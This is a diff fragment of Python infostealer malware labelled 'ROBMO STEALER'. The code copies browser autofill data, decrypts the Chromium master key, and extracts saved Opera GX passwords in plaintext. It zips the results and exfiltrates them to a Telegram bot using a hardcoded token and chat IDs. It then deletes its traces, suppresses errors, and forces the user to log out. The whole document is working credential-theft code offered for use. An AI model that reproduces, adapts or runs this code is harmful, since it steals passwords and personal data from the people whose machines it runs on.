 create_directory_if_not_exists(output_folder)
-admin_tlg_id = 1972505293
-def get_autofilldata(browsername, browser_path):
+
+def get_autofilldata(browser_name, browser_path):
     try:
         web_data_db = os.path.join(browser_path, "Web Data")
         web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
         shutil.copy2(web_data_db, web_data_db_copy)
         conn = sqlite3.connect(web_data_db_copy)
         cursor = conn.cursor()
+
         try:
             cursor.execute("SELECT name, value FROM autofill")
+
             autofill_data = ""
             for item in cursor.fetchall():
                 name = item[0]
                 value = item[1]
-                autofill_data += f"⮞ {name}: {value}\n{r}\n"
+                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"
+
         except sqlite3.Error:
             pass
+
         conn.close()
         os.remove(web_data_db_copy)
+
         if autofill_data:
-            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥_{browsername}.txt'), 'w', encoding='utf-8') as f:
-                f.write(i + s + r + s)
+            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
+                f.write(i + s + r + s + s)
                 f.write(autofill_data)
     except Exception as e:
         pass
     
-for browsername, browser_path in operagx.items():
-    get_autofilldata(browsername, browser_path)
+for browser_name, browser_path in operagx.items():
+    get_autofilldata(browser_name, browser_path)
     
 
 def gkey(path: str):
     if not os.path.exists(path):
         return None
+
     with open(path + "\\Local State", "r", encoding="utf-8") as f:
         local_state = json.load(f)
+
     encrypted_key = local_state["os_crypt"]["encrypted_key"]
     encrypted_key = base64.b64decode(encrypted_key)
     encrypted_key = encrypted_key[5:]
+
     try:
         decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         return decrypted_key
     except Exception as e:
-        print(f"Error decrypting key: {str(e)}")
-        return None
+        pass
 
 def decrypt_password(buff, master_key):
     iv = buff[3:15]
@@ -793,68 +767,130 @@ def decrypt_password(buff, master_key):
 def get_saved_passwords(browser_profile_path, master_key):
     login_data = os.path.join(browser_profile_path, 'Login Data')
     shutil.copy2(login_data, "LoginData.db")  
+
     conn = sqlite3.connect("LoginData.db")
     cursor = conn.cursor()
+
     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
     login_data = cursor.fetchall()
+
     decrypted_passwords = []
     for data in login_data:
         url, username, password = data
         password = decrypt_password(password, master_key)
         decrypted_passwords.append((url, username, password))
+
     conn.close()
     os.remove("LoginData.db")
+
     return decrypted_passwords
 
 def save_passwords_to_file(passwords, output_path, i):
     with open(output_path, "w", encoding="utf-8") as f:
         f.write(i + s + r + s + "\n")
         for url, username, password in passwords:
-            f.write(f"URL: {url}\n")
-            f.write(f"Username: {username}\n")
-            f.write(f"Password: {password}")
+            f.write(f"𝐔𝐑𝐋: {url}\n")
+            f.write(f"𝐔𝐬𝐞𝐫: {username}\n")
+            f.write(f"𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: {password}")
             f.write("\n\n═════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════" + "\n\n")
 
 def operagxx():
     user = os.path.expanduser("~")
+    
     profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable")
+    
     opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")
     if not os.path.exists(opera_folder):
         os.makedirs(opera_folder, exist_ok=True)
+    
     master_key = gkey(profile_path)
+
     if master_key:
         saved_passwords = get_saved_passwords(profile_path, master_key)
         if saved_passwords:
             output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt")  
-            save_passwords_to_file(saved_passwords, output_path, i)        
+            save_passwords_to_file(saved_passwords, output_path, i)
+            
 operagxx()  
 
-#zip file
+def create_zip(u_folder):
+    user = getuser()
 
-def send_file_to_telegram(token, chat_id, file_path):
-    url = f"https://api.telegram.org/bot{token}/sendDocument"
-    files = {'document': open(file_path, 'rb')}
-    params = {'chat_id': chat_id}
-    response = requests.post(url, files=files, data=params)
-def create_zip_file(user_folder, zip_filepath):
-    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for root, _, files in os.walk(user_folder):
-            for file in files:
-                file_path = os.path.join(root, file)
-                arcname = os.path.relpath(file_path, user_folder)
-                zipf.write(file_path, arcname)
-def send_message_to_telegram(token, chat_id, *messages):
-    url = f"https://api.telegram.org/bot{token}/sendMessage"
-    for message in messages:
-        params = {'chat_id': chat_id, 'text': message}
-        response = requests.post(url, data=params)
-user_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
-username = os.getenv("USERNAME")
-zip_filepath = os.path.join("C:\\Users", username, "Downloads", f'{username}[ROBMO].zip')
-create_zip_file(user_folder, zip_filepath)
-bot_token = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
-group_chat_id = -1001933102780
-send_message_to_telegram(bot_token, group_chat_id, f"══════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ══════", f"𝐔𝐬𝐞𝐫: {username}")
-send_file_to_telegram(bot_token, group_chat_id, zip_filepath)
-send_message_to_telegram(bot_token, admin_tlg_id, f"══════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ══════", f"𝐔𝐬𝐞𝐫: {username}")
-send_file_to_telegram(bot_token, admin_tlg_id, zip_filepath)
+    now = datetime.now()
+    zip_filename = f"𝑅𝑂𝐵𝑀𝑂[{now.day:02d}][{user}][{now.minute:02d}][{now.second:02d}].zip"
+
+    zip_filepath = os.path.join("C:\\Users", user, "Downloads", zip_filename)
+
+    try:
+        shutil.make_archive(zip_filepath[:-4], 'zip', u_folder)
+        return zip_filepath
+    except Exception as e:
+        pass
+        return None
+
+async def send_zip_to_telegram(zip_filepath, bot_token, chat_id):
+    bot = Bot(token=bot_token)
+
+    try:
+        user_name = getuser()  
+        user_message = f"𝐔𝐬𝐞𝐫: {user_name}"
+        await bot.send_message(chat_id=chat_id, text=user_message)
+
+        with open(zip_filepath, 'rb') as zip_file:
+            await bot.send_document(chat_id=chat_id, document=InputFile(zip_file))
+
+        separator_message = "═════════════════"
+        await bot.send_message(chat_id=chat_id, text=separator_message)
+
+    except Exception as e:
+        pass
+    
+async def send_zip_to_user(zip_filepath, bot_token, user_id):
+    bot = Bot(token=bot_token)
+
+    try:
+        user_name = getuser()  
+        user_message = f"𝐔𝐬𝐞𝐫: {user_name}"
+        await bot.send_message(chat_id=user_id, text=user_message)
+
+        with open(zip_filepath, 'rb') as zip_file:
+            await bot.send_document(chat_id=user_id, document=InputFile(zip_file))
+
+        separator_message = "═════════════════"
+        await bot.send_message(chat_id=user_id, text=separator_message)
+
+    except Exception as e:
+        pass
+    
+async def main():
+    u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
+
+    zip_filepath = create_zip(u_folder)
+
+    BOT_TOKEN = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
+    CHAT_ID = -1001933102780
+    USER_TLG_ID = 1972505293
+
+    if zip_filepath:
+        await send_zip_to_telegram(zip_filepath, BOT_TOKEN, CHAT_ID)
+        await send_zip_to_user(zip_filepath, BOT_TOKEN, USER_TLG_ID)
+
+        os.remove(zip_filepath)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
+def delete():
+    u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
+
+    try:
+        shutil.rmtree(u_folder)
+    except FileNotFoundError:
+        pass
+    except Exception as e:
+        pass
+delete()
+
+def logout():
+    return os.system('shutdown -l')
+logout()
